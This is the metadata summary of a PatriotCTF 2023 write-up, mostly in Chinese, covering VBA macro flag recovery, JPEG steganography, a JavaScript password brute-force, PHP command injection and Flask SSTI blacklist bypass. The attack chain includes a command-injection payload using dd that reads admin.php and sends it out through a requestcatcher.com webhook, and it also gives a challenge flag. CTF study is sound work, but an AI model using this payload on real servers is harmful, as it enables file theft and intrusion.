---
title: PatriotCTF 2023 Writeup
contest: PatriotCTF 2023
year: 2023
difficulty: medium
vuln_type: misc_unknown
tags: [vba, macro, jpeg-stego, js-password, ssrf, ssti, jinja2, binwalk, xss, oob]
attack_chain:
  - VBA 宏：chr 拼接 flag "PCTF{3n4bl3_m4cr05_plz_27315670}"
  - jpeg 隐写 binwalk -e 提取内嵌 audio.wav
  - checkName 字符串反转 == "uyjnimda" → "adnimjyu"
  - checkLength password.length % 6 === 0
  - checkValidity 按 6 字符分组 & | ^ 验证 0x60+0x61-0x6=0xbb
  - 6 重循环爆破 97-122 字符
  - check.php POST password
  - exec "php send_pass.php ${tmpPass} ${wh}" webhook 外带
  - filter_var FILTER_VALIDATE_URL + http://...requestcatcher.com/test
  - webhook 中 ?q=$(dd if=/var/www/html/admin.php bs=1 skip=325) 命令注入
  - Flask 黑名单 SSTI: config / update / builtins / 引号 / 加减 / 空格 / 中括号
  - render_template_string(render) 注入 {{}}
key_payload: chr(0x50)+chr(0x43)+...+chr(0x7D) = "PCTF{3n4bl3_m4cr05_plz_27315670}"
one_liner: PatriotCTF 2023 多题大杂烩：VBA 宏反推 flag、jpeg binwalk 提 audio、JS 密码 &|^ 验证爆破、PHP webhook + dd 命令注入、Flask SSTI 绕黑名单。
lesson: 宏 chr 拼接是直接可读 flag；binwalk 提 jpeg 尾 zip；JS 字符串反转 + 6 字符分组位运算校验；webhook + dd if=bs=1skip=325 经典命令外带；Flask render_template_string 是经典 SSTI 入口。
quality: medium
---
